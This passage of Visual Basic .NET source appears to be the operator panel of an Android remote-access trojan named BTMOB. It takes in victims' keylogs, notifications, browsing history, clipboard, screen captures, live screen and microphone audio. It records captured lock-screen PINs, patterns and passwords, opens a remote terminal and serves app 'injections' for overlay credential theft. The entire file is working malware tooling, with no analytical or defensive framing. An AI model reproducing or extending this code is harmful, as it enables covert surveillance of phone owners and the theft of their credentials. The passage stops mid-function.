Imports System.IO
Imports System.Media
Imports System.Net
Imports System.Net.Http
Imports System.Net.NetworkInformation
Imports System.Net.Sockets
Imports System.Security.AccessControl
Imports System.Security.Cryptography
Imports System.Security.Policy
Imports System.Text
Imports System.Threading

Imports System.Windows.Forms.AxHost
Imports BTMOB.filesmanager
Imports BTMOB.My
Imports DrakeUI.Framework
Imports ImageMagick
Imports Newtonsoft.Json
Imports Newtonsoft.Json.Linq
Imports WebSocket4Net

Public NotInheritable Class BTEngine

    Public Shared u_email As String = ""
    Public Shared share_link As String = ""
    Public Shared u_uid As String = ""
    Public Shared u_subtype As String = ""
    Public Shared u_exp As String = ""
    Public Shared BytesSent As Long
    Public Shared BytesReceived As Long

    Public Shared mainSocket As WebSocketClient
    Public Shared MainForm As Form1

    Public Shared BlockedClients As New List(Of String)

    Public Shared clients As New Dictionary(Of String, BTClient)
    Public Shared unkownkeys As New List(Of String)
    Public Shared GeoIP0 As New GeoIP(MyRes.GEOIP_Path)

    Public Shared ReadOnly lockadd As New Object() ' Lock object
    Public Shared ReadOnly lockworker As New Object() ' Lock object
    Public Shared SocketsCount = 0

    ' Public Shared LockAdd As New Object

    Public Shared Function isblocked(iporid) As Boolean
        If BlockedClients.Contains(iporid) Then
            Return True
        End If
        Return False
    End Function

    Public Shared Sub commandsleep(mobid As String)

        Dim data As New With {
                            .subcommand = "0"
                        }
        Dim commandstr As String = FormatCommand("Sleep", data)


        Dim chatData As New Dictionary(Of String, Object) From {
                                            {"msg", wrk},
                                            {"cmnd", commandstr}
                }
        BTEngine.commands(chatData, mobid, MainForm.webSocketClient)
    End Sub

    '
    Public Shared Sub HandleMessage(messageJson As String)
        Try


            Dim message = JsonConvert.DeserializeObject(Of Dictionary(Of String, Object))(messageJson)
            If message Is Nothing Then
                Log_e("HandleMessage", "Empty Message")
                Return
            End If



            Dim ClientAddress As String = ""

            Try
                ClientAddress = message("cip").ToString()
            Catch ex As Exception
                ClientAddress = "Unknown"
            End Try



            Dim IMsgType As String = message("type").ToString()


            Dim mobid As String = If(message.ContainsKey("pid"), message("pid").ToString(), Nothing)
            If mobid Is Nothing Then
                Log_e("HandleMessage", "Mobid is null")
                Return
            End If

            Dim conkey As String = If(message.ContainsKey("cokey"), message("cokey").ToString(), "BTMOB")

            If MainForm.ConnectionKey <> conkey Then
                If Not unkownkeys.Contains(mobid) Then
                    unkownkeys.Add(mobid)
                    MainForm.LogConnection(BTConst.Blockedstr, connectionicon("block"), ClientAddress, unkwnkeystr)
                End If
                commandsleep(mobid)
                Return
            End If


            If isblocked(ClientAddress) Then

                commandsleep(mobid)
                Return
            End If


            If isblocked(mobid) Then

                commandsleep(mobid)
                Return
            End If


            Log_d("New Message [Client_ip]:", ClientAddress)

            If IMsgType <> "msg" Then
                'If IMsgType = "notify" Then
                '    Dim alertdata As String = message("data").ToString()
                '    ' BTAlerter.infos(alertdata)
                'End If
                'Log_e("HandleMessage error", $"Unknown type: {IMsgType}")
                Return
            End If


            Dim data As Dictionary(Of String, Object) = JsonConvert.DeserializeObject(Of Dictionary(Of String, Object))(message("data"))
            If data Is Nothing Then
                Log_e("HandleMessage 2", "Empty Message 2")
                Return
            End If

            Dim thecommand As String = data("type").ToString

            Log_d("New [Command]:", thecommand)


            'Dim clcc As BTClient = GetClientById(mobid)
            'If clcc IsNot Nothing Then
            '    clcc.IamOnline()
            'End If

            Select Case thecommand
                Case addme
                    ' SyncLock lockadd
                    AddOrUpdateClient(data, ClientAddress)
                    'Task.Run(Sub() AddOrUpdateClient(data, ClientAddress))
                    ' End SyncLock
                    'AddOrUpdateClient(data, ClientAddress)
                    Exit Select
                Case pingcom


                    Try



                        Dim classclient As BTClient = GetClientById(mobid)
                        If classclient Is Nothing Then
                            Dim chatData As New Dictionary(Of String, Object) From {
                                {"msg", addme}
                            }
                            commands(chatData, mobid, MainForm.webSocketClient)
                            Return
                        End If
                        If classclient.row Is Nothing Then
                            Dim chatData As New Dictionary(Of String, Object) From {
                                {"msg", addme}
                            }
                            commands(chatData, mobid, BTEngine.MainForm.webSocketClient)
                            Return
                        End If

                        classclient.IamOnline()
                        Try

                            Dim screenstate As String = data("scr").ToString
                            Dim pingms As String = data("ms").ToString
                            Dim activenow As String = data("act").ToString
                            Dim jectscount As String = If(data.ContainsKey("jct"), data("jct")?.ToString(), "0")
                            Dim keylogs As String = If(data.ContainsKey("keylogs"), data("keylogs")?.ToString(), "null")
                            Dim vapps As String = If(data.ContainsKey("vapps"), data("vapps")?.ToString(), "null")
                            Dim activz As String = If(data.ContainsKey("activz"), data("activz")?.ToString(), "null")
                            Dim notifys As String = If(data.ContainsKey("notifys"), data("notifys")?.ToString(), "null")
                            Dim vLinks As String = If(data.ContainsKey("vLinks"), data("vLinks")?.ToString(), "null")
                            Dim MobAngle As String = If(data.ContainsKey("AN"), data("AN")?.ToString(), "")
                            Dim RoomLights As String = If(data.ContainsKey("LT"), data("LT")?.ToString(), "")
                            ' Dim isMoving As String = If(data.ContainsKey("MV"), data("MV")?.ToString(), "")
                            Dim BatteryPercentage As String = If(data.ContainsKey("BP"), data("BP")?.ToString(), classclient.charging) 'getBatteryPercentage
                            Dim isCharging As String = If(data.ContainsKey("BC"), data("BC")?.ToString(), "") ' isCharging
                            Dim alljects As String = If(data.ContainsKey("jcts"), data("jcts")?.ToString(), "") ' founded injections

                            Dim req_update As String = If(data.ContainsKey("requ"), data("requ")?.ToString(), "0") ' request update
                            Dim update_tag As String = If(data.ContainsKey("tagu"), data("tagu")?.ToString(), "N/A") ' update to tag


                            classclient.UpdateRequested = If(req_update = "1", True, False)
                            classclient.UpdateTag = update_tag
                            classclient.pingms = pingms
                            classclient.screen = CType(GetScreen(screenstate), Bitmap)
                            classclient.activewindow = activenow
                            classclient.jects_count = jectscount
                            classclient.angle = MobAngle
                            classclient.lights = RoomLights
                            classclient.charging = BatteryPercentage
                            If alljects.Length > 0 AndAlso alljects.Contains("|") Then
                                classclient.Foundedjects = alljects.Replace("|", vbNewLine)
                            Else
                                classclient.Foundedjects = "N/A"
                            End If




                            Select Case isCharging
                                Case "f"
                                    classclient.battery = GetBattery(BatteryPercentage)
                                    Exit Select
                                Case Else
                                    classclient.battery = My.Resources.battery_oncharge
                                    Exit Select
                            End Select

                            'MainForm.UpdateClient(New Object() {classclient})



                            classclient.keyloggs = keylogs
                            classclient.activies = activz
                            classclient.visitedapps = vapps
                            classclient.notifications = notifys
                            classclient.visitedlinks = vLinks


                        Catch ex As Exception
                            Log_e("pingcom_1", EXtoString(ex))
                        End Try

                        Dim optndata As New Dictionary(Of String, Object) From {
                                {"msg", optns},
                                {"sidf", classclient.SecoundIDF},
                                {"op", classclient.ReadOptions}
                            }
                        commands(optndata, mobid, BTEngine.MainForm.webSocketClient)
                        '  classclient.count_pings += 1
                        If classclient.row IsNot Nothing Then
                            MainForm.UpdateClient(New Object() {classclient})
                            'Task.Run(Sub() MainForm.UpdateClient(New Object() {classclient})).ConfigureAwait(False)
                        End If

                    Catch ex As Exception
                        Log_e("pingcom", EXtoString(ex))
                    End Try

                    Exit Select

                Case snapcom
                    Try
                        Dim scrimg = data("img").ToString().Replace(vbLf, "").Replace(vbCr, "").Replace(" ", "")
                        Dim imgBitmap As Bitmap
                        Dim imgBytes() As Byte = Convert.FromBase64String(scrimg)
                        Dim classclient As BTClient = GetClientById(mobid)
                        If classclient Is Nothing Then
                            Return
                        End If
                        Using ms As New MemoryStream(imgBytes, 0, imgBytes.Length, writable:=True, publiclyVisible:=True)

                            Using magickImg As New MagickImage(ms)

                                imgBitmap = magickImg.ToBitmap()


                            End Using
                        End Using
                        If imgBitmap IsNot Nothing Then
                            Dim savepath As String = classclient.userfolder & "\Snapshots"
                            If Not Directory.Exists(savepath) Then
                                Directory.CreateDirectory(savepath)
                            End If
                            Dim timestamp As String = DateTime.Now.ToString("yyyyMMdd_HHmmss")
                            Dim filename As String = savepath & "\BTSnap_" & timestamp & ".png"


                            imgBitmap.Save(filename, Imaging.ImageFormat.Png)


                            Process.Start(savepath)
                            imgBitmap.Dispose()
                        End If

                    Catch ex As Exception
                        Log_e("snapcom", EXtoString(ex))
                    End Try
                    Exit Select
                Case livescreencom
                    Try
                        Dim classclient As BTClient = GetClientById(mobid)
                        If classclient Is Nothing Then
                            Return
                        End If
                        Dim imgbase64 = data("img").ToString().Replace(vbLf, "").Replace(vbCr, "").Replace(" ", "")
                        Dim imgBitmap As Bitmap
                        Dim imgBytes() As Byte = Convert.FromBase64String(imgbase64)
                        Using ms As New MemoryStream(imgBytes, 0, imgBytes.Length, writable:=True, publiclyVisible:=True)

                            Using magickImg As New MagickImage(ms)

                                imgBitmap = magickImg.ToBitmap()


                            End Using
                        End Using
                        If imgBitmap IsNot Nothing Then
                            If MainForm.clientPanels.ContainsKey(mobid) Then
                                ' Find the PictureBox inside the panel (the main image is the third control)
                                'MainForm.UpdateScreen(mobid, imgBitmap)
                                Dim clientPanel As Panel = MainForm.clientPanels(mobid)
                                Dim clientImagePictureBox As PictureBox = CType(clientPanel.Controls(0), PictureBox)
                                clientImagePictureBox.Image = imgBitmap
                            Else
                                classclient.UpdateOption("livescreen", "0")
                            End If

                        End If

                    Catch ex As Exception
                        Log_e("livescreencom", EXtoString(ex))
                    End Try
                    Exit Select
                Case screadcom
                    Try
                        Dim handle As String = "BT-" & "Reader-" & mobid
                        Dim screenform As ScreenReader = My.Application.OpenForms(handle)
                        If screenform Is Nothing Then
                            Dim chatData As New Dictionary(Of String, Object) From {
                              {"msg", "scread"},
                              {"cas", "0"}
                         }
                            BTEngine.commands(chatData, mobid, MainForm.webSocketClient)

                            Return
                        End If

                        Dim scrimg = data("img").ToString().Replace(vbLf, "").Replace(vbCr, "").Replace(" ", "")
                        Dim formate = data("frmt").ToString()




                        Dim imgBitmap As Bitmap
                        Dim imgBytes() As Byte = Convert.FromBase64String(scrimg)
                        Using ms As New MemoryStream(imgBytes, 0, imgBytes.Length, writable:=True, publiclyVisible:=True)
                            Try
                                If formate = "w" Then

                                    Using magickImg As New MagickImage(ms)

                                        imgBitmap = magickImg.ToBitmap()

                                    End Using
                                End If
                            Catch ex As Exception
                                Log_e("screadcom 2", EXtoString(ex))
                                imgBitmap = Nothing
                            End Try

                        End Using

                        If imgBitmap IsNot Nothing Then
                            screenform.viewimage.Image = imgBitmap
                            If screenform.myscr.Visible Then
                                MainForm.Invoke(Sub()
                                                    screenform.myscr.Visible = False
                                                End Sub)
                            End If

                        End If
                        screenform.newphoto = True
                        screenform.FPS += 1

                        Dim screenwidth = data("wmob").ToString()
                        Dim screenhieght = data("hmob").ToString()
                        If screenform.screenSize = Nothing Then
                            screenform.screenSize = New Size(CInt(screenwidth), CInt(screenhieght))
                        End If

                    Catch ex As Exception
                        Log_e("screadcom", EXtoString(ex))
                    End Try
                    Exit Select
                Case screencom
                    Try


                        Dim handle As String = "BT-" & "Screen-" & mobid

                        Dim screenform As ScreenMonitor = My.Application.OpenForms(handle)

                        If screenform Is Nothing Then
                            Dim datascroff As New With {
                                .subcommand = "OFF"
                            }

                            Dim commandstr As String = FormatCommand("Screen", datascroff)


                            Dim chatData As New Dictionary(Of String, Object) From {
                                                {"msg", wrk},
                                                {"cmnd", commandstr}
                            }
                            BTEngine.commands(chatData, mobid, MainForm.webSocketClient)

                            Try
                                If data.ContainsKey("skly") Then
                                    Dim skiliimage = data("skly").ToString()

                                    If skiliimage = "1" Then
                                        Dim stopskle As New Dictionary(Of String, Object) From {
                                              {"msg", "screen"},
                                               {"subc", "skilton"},
                                               {"skstate", "0"}
                                        }
                                        BTEngine.commands(chatData, mobid, MainForm.webSocketClient)
                                    End If
                                End If

                            Catch ex As Exception

                            End Try

                            Return
                        End If

                        Dim scrimg = data("img").ToString().Replace(vbLf, "").Replace(vbCr, "").Replace(" ", "")
                        Dim formate = data("frmt").ToString()




                        Dim imgBitmap As Bitmap
                        Dim imgBytes() As Byte = Convert.FromBase64String(scrimg)
                        Using ms As New MemoryStream(imgBytes, 0, imgBytes.Length, writable:=True, publiclyVisible:=True)
                            Try
                                If formate = "w" Then

                                    Using magickImg As New MagickImage(ms)

                                        imgBitmap = magickImg.ToBitmap()

                                    End Using
                                End If
                            Catch ex As Exception
                                Log_e("screen 2", EXtoString(ex))
                                imgBitmap = Nothing
                            End Try

                            If imgBitmap Is Nothing Then
                                Try
                                    If formate = "p" Then
                                        ms.Position = 0
                                        Using img As Bitmap = Image.FromStream(ms)
                                            imgBitmap = New Bitmap(img)
                                        End Using
                                    End If
                                Catch ex2 As Exception
                                    Log_e("screen 3", EXtoString(ex2))
                                    imgBitmap = Nothing
                                End Try
                            End If

                        End Using



                        If imgBitmap IsNot Nothing Then
                            Dim skiliimage = data("skly").ToString()
                            If skiliimage = "1" Then
                                If screenform.LiveisBigger Then
                                    screenform.smallviewimage.Image = imgBitmap
                                Else
                                    screenform.viewimage.Image = imgBitmap
                                End If
                                screenform.myscr.Visible = False
                            Else
                                If Not screenform.LiveisBigger Then
                                    screenform.smallviewimage.Image = imgBitmap
                                Else
                                    screenform.viewimage.Image = imgBitmap
                                End If

                            End If
                            screenform.FPS += 1
                            screenform.CurrentState = "Connected"
                            If screenform.myscr.Visible Then
                                screenform.Invoke(Sub()
                                                      screenform.myscr.Visible = False
                                                  End Sub)
                            End If

                            Dim screenwidth = data("wmob").ToString()
                            Dim screenhieght = data("hmob").ToString()
                            If screenform.screenSize = Nothing Then
                                screenform.screenSize = New Size(CInt(screenwidth), CInt(screenhieght))
                            End If


                        Else
                            screenform.CurrentState = "Something went wrong."
                        End If




                    Catch ex As Exception
                        Log_e("screen", EXtoString(ex))
                    End Try
                    Exit Select
                Case lockcom
                    Try
                        Dim classclient As BTClient = GetClientById(mobid)
                        If classclient Is Nothing Then
                            Return
                        End If

                        Dim handle As String = "BT-" & "locker-" & mobid
                        Dim lockerform As lockscreen = My.Application.OpenForms(handle)

                        Dim islocked As Boolean = Boolean.Parse(data("islk").ToString)
                        Dim capturelock As String = "Unknown"
                        If data("caplk") IsNot Nothing Then
                            If data("caplk").ToString.Length > 0 Then
                                capturelock = data("caplk").ToString
                            End If
                        End If
                        Dim passcods = data("cods").ToString

                        MainForm.Invoke(Sub()
                                            If lockerform Is Nothing Then
                                                lockerform = New lockscreen
                                                lockerform.Tag = "locker" + mobid
                                                lockerform.Name = handle
                                                lockerform.BTcli = classclient
                                                lockerform.Show()
                                            End If
                                            lockerform.DGV0.Rows.Clear()

                                            If capturelock.Contains(":") Then
                                                Dim capdata() As String = capturelock.Split(":")
                                                Dim typ_cap As String = capdata(0)
                                                Dim thepin As String = capdata(1)
                                                If typ_cap = "pa" Then
                                                    lockerform.DGV0.Rows.Add("Captured Password", thepin)
                                                ElseIf typ_cap = "pt" Then
                                                    lockerform.DGV0.Rows.Add("Captured Pattern", thepin)
                                                ElseIf typ_cap = "pi" Then
                                                    lockerform.DGV0.Rows.Add(" Captured Pin", thepin)
                                                End If
                                            End If

                                            If passcods.Contains("*") Then
                                                For Each ps As String In passcods.Split("*")
                                                    If ps.Contains("|") Then
                                                        Dim codeinfo() As String = ps.Split("|"c)
                                                        If codeinfo.Length = 2 Then
                                                            Dim thepin As String = codeinfo(0)
                                                            Dim thetype As String = codeinfo(1)
                                                            If thetype = "1" Then
                                                                lockerform.DGV0.Rows.Add("Pattern", thepin)
                                                            ElseIf thetype = "2" Then
                                                                lockerform.DGV0.Rows.Add("Pin", thepin)
                                                            ElseIf thetype = "3" Then
                                                                lockerform.DGV0.Rows.Add("Password", thepin)
                                                            End If

                                                        End If
                                                    End If
                                                Next
                                            End If

                                            lockerform.switchlock(islocked)
                                        End Sub)

                    Catch ex As Exception
                        Log_e("lockcom", EXtoString(ex))
                    End Try
                    Exit Select
                Case jectcom
                    Try
                        Dim classclient As BTClient = GetClientById(mobid)
                        If classclient Is Nothing Then
                            Return
                        End If

                        Dim handle As String = "BT-" & "jections-" & mobid
                        Dim jectform As injections = My.Application.OpenForms(handle)
                        Dim jectdata = data("jdata").ToString

                        Dim jsonArray As JArray = JArray.Parse(jectdata)


                        MainForm.Invoke(Sub()
                                            If jectform Is Nothing Then
                                                jectform = New injections
                                                jectform.Tag = "jections" + mobid
                                                jectform.Name = handle
                                                jectform.myico.Image = classclient.wallpaper
                                                jectform.mytitle.Text = injctstr & " | " & classclient.name & " | " & classclient.country
                                                'jectform.mobid = mobid
                                                jectform.Show()
                                            End If

                                            For Each item As JObject In jsonArray

                                                Dim appId As String = item("appId").ToString()
                                                jectform.combojects.Items.Add(appId)

                                                Dim datajct As JToken = item("data")

                                                Dim App_jdata = ""



                                                If TypeOf datajct Is JArray Then

                                                    For Each entry As String In datajct

                                                        App_jdata += " - " & entry & vbNewLine
                                                    Next
                                                Else


                                                    App_jdata += " - " & datajct.ToString() & vbNewLine
                                                End If

                                                jectform.jectlist.Add(appId, App_jdata)

                                            Next


                                        End Sub)

                        If BTRegistry.ReadBool(BTSettings.autosave, True) Then
                            codes.SaveJson(jectdata, classclient.userfolder, "injections", "inj_")
                        End If

                    Catch ex As Exception
                        Log_e("jectcom", EXtoString(ex))
                    End Try
                    Exit Select
                Case trmcom
                    Try
                        Dim classclient As BTClient = GetClientById(mobid)
                        If classclient Is Nothing Then
                            Return
                        End If

                        Dim handle As String = "BT-" & "terminal-" & mobid

                        Dim terminalform As terminal = My.Application.OpenForms(handle)

                        Dim callcase = data("case").ToString
                        If callcase = "l" Then
                            Dim andver = data("extra").ToString
                            MainForm.Invoke(Sub()
                                                If terminalform Is Nothing Then
                                                    terminalform = New terminal
                                                    terminalform.Name = handle
                                                    terminalform.androidver = andver
                                                    terminalform.BTcli = classclient
                                                    terminalform.Show()
                                                End If

                                            End Sub)

                        ElseIf callcase = "r" Then
                            Dim response = data("extra").ToString
                            If terminalform IsNot Nothing Then
                                terminalform.Invoke(Sub()
                                                        terminalform.printterminal(response)
                                                    End Sub)
                            End If
                        End If

                    Catch ex As Exception
                        Log_e("trmcom", EXtoString(ex))
                    End Try
                Case clipbordcom
                    Try
                        Dim classclient As BTClient = GetClientById(mobid)
                        If classclient Is Nothing Then
                            Return
                        End If

                        Dim handle As String = "BT-" & "Clips-" & mobid

                        Dim clipform As Clipboard = My.Application.OpenForms(handle)



                        Dim clipdata = data("cdata").ToString
                        MainForm.Invoke(Sub()
                                            If clipform Is Nothing Then
                                                clipform = New Clipboard
                                                clipform.Tag = "Clips" + mobid
                                                clipform.Name = handle
                                                clipform.mobid = mobid
                                                clipform.Show()
                                            End If
                                            clipform.logclipboard.Text = clipdata
                                        End Sub)

                    Catch ex As Exception
                        Log_e("clipbordcom", EXtoString(ex))
                    End Try
                    Exit Select
                Case alrtusrcom

                    Try
                        Dim alrt_title = data("title").ToString
                        If alrt_title.StartsWith("Screen State") Then
                            Return
                        End If
                        Dim alrt_msg = data("msg").ToString
                        Dim classclient As BTClient = GetClientById(mobid)
                        If classclient Is Nothing Then
                            Return
                        End If
                        MainForm.insertnotification(classclient.wallpaper, classclient.name, alrt_title, alrt_msg)

                    Catch ex As Exception
                        Log_e("alrtusrcom", EXtoString(ex))
                    End Try
                    Exit Select
                Case files

                    Try
                        Dim data_files = ParsefilesData(data("data").ToString)

                        Dim handle As String = "BT-" & "Files-" & mobid
                        Dim FileManager As filesmanager = My.Application.OpenForms(handle)
                        Dim classclient As BTClient = GetClientById(mobid)
                        If classclient Is Nothing Then
                            Return
                        End If


                        'background thread

                        MainForm.Invoke(Sub()
                                            'main thread UI
                                            If FileManager Is Nothing Then
                                                FileManager = New filesmanager
                                                FileManager.Tag = "Files" + mobid
                                                FileManager.Name = handle
                                                FileManager.Btcli = classclient
                                                FileManager.listfilesvew.Tag = ""
                                                FileManager.listfilesvew.ListViewItemSorter = Nothing
                                                FileManager.Show()
                                            End If

                                            FileManager.emptytext.Visible = False
                                            FileManager.emptytext.SendToBack()
                                            FileManager.listfilesvew.ClearObjects()
                                            FileManager.listfilesvew.BeginUpdate()
                                        End Sub)


                        ' FileManager.filesicons.Images.Clear()
                        'FileManager.thumbsimags.Images.Clear()
                        'FileManager.listfilesvew.BeginUpdate()
                        'FileManager.listfilesvew.SuspendLayout()
                        'FileManager.PBtitlebar.BringToFront()
                        ' Background work for data processing
                        Dim Counter As Integer = 0
                        Dim tempfile = data_files(0)
                        Dim fileRows As New List(Of FileRow)()
                        FileManager.isloading = True
                        ' Process storage info (non-UI)
                        If tempfile IsNot Nothing AndAlso tempfile("storeused") IsNot Nothing AndAlso tempfile("storesize") IsNot Nothing Then
                            If tempfile("storeused").ToString <> "0" AndAlso tempfile("storesize").ToString <> "0" Then
                                Dim storeusedValue As Double
                                Dim storesizeValue As Double

                                If Double.TryParse(tempfile("storeused").ToString(), storeusedValue) AndAlso Double.TryParse(tempfile("storesize").ToString(), storesizeValue) Then
                                    ' UI update for storage usage
                                    Dim percentageUsed As Integer = CInt(Math.Min((storeusedValue / storesizeValue) * 100, 100))
                                    FileManager.Invoke(Sub()
                                                           FileManager.usagetitle.Text = $"Storage : {storeusedValue} GB of {storesizeValue} GB used"

                                                           ' Ensure it doesn't exceed 100%
                                                           FileManager.usageprecent.Value = percentageUsed
                                                       End Sub)

                                End If
                            End If
                        End If

                        ' Process files in background
                        Dim stringtagpath As String = ""
                        Dim HideEmptyFolder As Boolean = BTRegistry.ReadBool(BTSettings.hideEfolder, False)
                        Dim HideEmptyFile As Boolean = BTRegistry.ReadBool(BTSettings.hideEfiles, False)
                        For index As Integer = 0 To data_files.Count - 1
                            Dim file = data_files(index)


                            If file Is Nothing OrElse file("name").ToString() = "Empty" Then
                                If file IsNot Nothing AndAlso file("path") IsNot Nothing Then
                                    ' UI update for empty text visibility
                                    FileManager.Invoke(Sub()
                                                           FileManager.listfilesvew.Tag = file("path").ToString()
                                                           stringtagpath = file("path")
                                                           FileManager.emptytext.Visible = True
                                                           FileManager.emptytext.BringToFront()
                                                           FileManager.pathtxt.Text = FileManager.listfilesvew.Tag
                                                       End Sub)
                                End If
                                Continue For
                            End If

                            ' UI updates for non-empty file (invoke needed)
                            stringtagpath = file("path")

                            ' Process each file (non-UI)
                            Dim extension As String = ""
                            If file("name").ToString().Contains(".") Then
                                extension = file("name").ToString().Substring(file("name").ToString().LastIndexOf("."))
                            End If

                            Dim icon As Bitmap = Nothing

                            Try
                                icon = If(file("type") = "0", GetIcon(MyRes.Resources_Path, True), GetFileIcon(extension))
                            Catch ex As Exception
                                icon = DirectCast(My.Resources.info_blue.Clone, Bitmap)
                            End Try

                            ' Prepare file row for the listview (non-UI)
                            Dim row As New FileRow()
                            row.Name = file("name").ToString()

                            Dim safeIcon As Bitmap
                            If icon IsNot Nothing Then
                                Try
                                    safeIcon = DirectCast(icon.Clone(), Bitmap)
                                Catch ex As Exception
                                    safeIcon = New Bitmap(1, 1)
                                End Try
                            Else
                                safeIcon = New Bitmap(1, 1)
                            End If

                            row.Icon = safeIcon

                            ' FileManager.listfilesvew.SmallImageList.Images.Add(icon)
                            ' FileManager.listfilesvew.LargeImageList.Images.Add(icon)

                            Dim contentCount As Integer = If(file("filesCount") IsNot Nothing AndAlso file("filesCount") <> -1, CInt(file("filesCount")), 0)

                            If CInt(file("type")) = 1 Then

                                If HideEmptyFile AndAlso file("size") = 0 Then
                                    Continue For
                                End If

                                row.IsFile = True
                                row.TypeDescription = $"File [{extension}]"
                                row.SizeDescription = bytestotext(CLng(file("size")))
                            Else

                                If contentCount = 0 AndAlso HideEmptyFolder Then
                                    Continue For
                                End If

                                row.IsFile = False
                                row.TypeDescription = $"Folder [{contentCount}]"
                                row.SizeDescription = " "
                            End If

                            row.ModifiedDate = file("modifiedDate").ToString()
                            row.CreateDate = file("createDate").ToString()

                            'If file("modifiedDate").ToString() = file("createDate").ToString() Then
                            '    '  row.DefaultCellStyle.ForeColor = Color.Red 
                            'End If


                            fileRows.Add(row)
                            Dim parvalue As Integer = codes.RateConverter(Counter, data_files.Count - 1)
                            FileManager.Invoke(Sub()
                                                   FileManager.PBtitlebar.Value = parvalue
                                               End Sub)



                            Counter += 1
                            'Application.DoEvents()
                        Next

                        FileManager.Invoke(Sub()

                                               FileManager.listfilesvew.Tag = stringtagpath
                                               FileManager.PBtitlebar.Value = 0

                                               FileManager.listfilesvew.SetObjects(fileRows)
                                               FileManager.listfilesvew.EndUpdate()
                                               FileManager.isloading = False
                                               FileManager.pathtxt.Text = FileManager.listfilesvew.Tag
                                           End Sub)

                        If FileManager.visited.ContainsKey(FileManager.listfilesvew.Tag) Then
                            Dim lastindexclick As Integer = FileManager.visited(FileManager.listfilesvew.Tag)
                            If lastindexclick >= 0 AndAlso lastindexclick < FileManager.listfilesvew.Items.Count Then

                                FileManager.Invoke(Sub()
                                                       FileManager.listfilesvew.Items(lastindexclick).Selected = True
                                                       FileManager.listfilesvew.EnsureVisible(lastindexclick)
                                                   End Sub)
                            End If
                        End If
                    Catch ex As Exception
                        Log_e("filescom", EXtoString(ex))
                    End Try

                    Exit Select
                Case Micrphonecom
                    Try
                        Dim handle As String = "BT-" & "Microphone-" & mobid
                        Dim micform As MicMonitor = My.Application.OpenForms(handle)

                        If micform Is Nothing Then
                            Dim chatData As New Dictionary(Of String, Object) From {
                                 {"msg", "mic"},
                                 {"subc", "OFF"}
                            }
                            BTEngine.commands(chatData, mobid, MainForm.webSocketClient)
                            If micform.isRecording Then
                                micform.isRecording = False


                                Dim savepath As String = micform.Btcli.userfolder & "\AudioRecords"
                                If Not Directory.Exists(savepath) Then
                                    Directory.CreateDirectory(savepath)
                                End If

                                Dim timestamp As String = DateTime.Now.ToString("yyyyMMdd_HHmmss")
                                Dim filename As String = savepath & "\BTRec_" & timestamp & ".wav"
                                SaveWavFile(micform.audioParts, filename)
                                MainForm.Invoke(Sub()
                                                    BTAlerter.Success(recosavedstr)
                                                End Sub)
                                micform.audioParts.Clear()
                                Process.Start(savepath)
                            End If
                            Return
                        End If



                        Dim wavbase As String = data("voc").ToString()

                        Dim wavData As Byte() = Convert.FromBase64String(wavbase)

                        micform.visualizer.Play(wavData)
                        If Not micform.mictoolbox.Enabled Then
                            micform.Invoke(Sub()
                                               micform.mictoolbox.Enabled = True
                                           End Sub)
                        End If



                        If micform.recordbtn.TagString = "1" Then
                            micform.isRecording = True
                            micform.audioParts.Add(wavData)
                        ElseIf micform.recordbtn.TagString = "0" Then
                            If micform.isRecording Then
                                micform.isRecording = False


                                Dim savepath As String = micform.Btcli.userfolder & "\AudioRecords"
                                If Not Directory.Exists(savepath) Then
                                    Directory.CreateDirectory(savepath)
                                End If

                                Dim timestamp As String = DateTime.Now.ToString("yyyyMMdd_HHmmss")
                                Dim filename As String = savepath & "\BTRec_" & timestamp & ".wav"
                                SaveWavFile(micform.audioParts, filename)
                                MainForm.Invoke(Sub()
                                                    BTAlerter.Success(recosavedstr)
                                                End Sub)
                                micform.audioParts.Clear()
                                Process.Start(savepath)
                            End If
                        End If

                    Catch ex As Exception
                        Log_e("Micrphonecom", EXtoString(ex))
                    End Try
                    Exit Select
                Case jectscom
                    Try
                        Dim callcuz As String = data("cuz").ToString
                        If callcuz = "l" Then 'send names from folder 


                            Dim chatData As New Dictionary(Of String, Object) From {
                                {"msg", loadjects},
                                {"jdat", BTEngine.MainForm.Allinjections}
                            }
                            commands(chatData, mobid, BTEngine.MainForm.webSocketClient)


                        ElseIf callcuz = "f" Then 'fetch file to phone (packagename found)

                            Dim neededzips As String = data("ned").ToString
                            Dim sendert As Thread = New Thread(Sub()
                                                                   sendjects(neededzips, mobid)
                                                               End Sub)
                            sendert.IsBackground = True
                            sendert.Start()
                        End If
                    Catch ex As Exception
                        Log_e("jectscom", EXtoString(ex))
                    End Try
                Case Clonecom
                    Try

                        Dim handle As String = "BT-" & "APPS-" & mobid
                        Dim appsform As AppsManager = My.Application.OpenForms(handle)


                        Dim callcuz As String = data("cuz").ToString
                        If callcuz = "l" Then
                            Dim classclient As BTClient = GetClientById(mobid)
                            If appsform Is Nothing Then
                                If classclient Is Nothing Then
                                    Return
                                End If
                                MainForm.Invoke(Sub()
                                                    appsform = New AppsManager
                                                    appsform.Name = handle
                                                    appsform.Btcli = classclient

                                                    appsform.Show()
                                                End Sub)
                            End If
                            Dim Appsdata As String = FromBase64(data("data"))

                            Dim apps As List(Of Dictionary(Of String, Object)) = JsonConvert.DeserializeObject(Of List(Of Dictionary(Of String, Object)))(Appsdata)
                            Dim rowsToAdd As New List(Of DataGridViewRow)()
                            For Each app As Dictionary(Of String, Object) In apps
                                Dim name As String = app("n").ToString()
                                Dim pkg As String = app("p").ToString()
                                Dim isSys As String = app("iss").ToString()
                                Dim isHidden As String = app("ish").ToString()
                                Dim row As New DataGridViewRow()
                                row.CreateCells(appsform.DGV_CLONE, My.Resources.cloneicon, name, pkg, If(isSys = "1", "System", "User"), If(isHidden = "1", My.Resources.app_disabled, My.Resources.app_enabled))
                                row.Tag = pkg

                                rowsToAdd.Add(row)

                            Next
                            Dim isactivestr As String = data("state").ToString
                            appsform.Invoke(Sub()
                                                appsform.DGV_CLONE.Rows.Clear()
                                                appsform.DGV_CLONE.Rows.AddRange(rowsToAdd.ToArray)


                                                If isactivestr = "1" Then
                                                    appsform.enablebtn.Enabled = False
                                                    appsform.disablebtn.Enabled = True

                                                Else
                                                    appsform.enablebtn.Enabled = True
                                                    appsform.disablebtn.Enabled = False
                                                End If
                                            End Sub)

                            'appjson

                        End If

                    Catch ex As Exception

                    End Try
                Case Appscom
                    Try
                        Dim handle As String = "BT-" & "APPS-" & mobid
                        Dim appsform As AppsManager = My.Application.OpenForms(handle)


                        Dim callcuz As String = data("cuz").ToString
                        If callcuz = "l" Then
                            Dim classclient As BTClient = GetClientById(mobid)
                            If appsform Is Nothing Then

                                If classclient Is Nothing Then
                                    Return
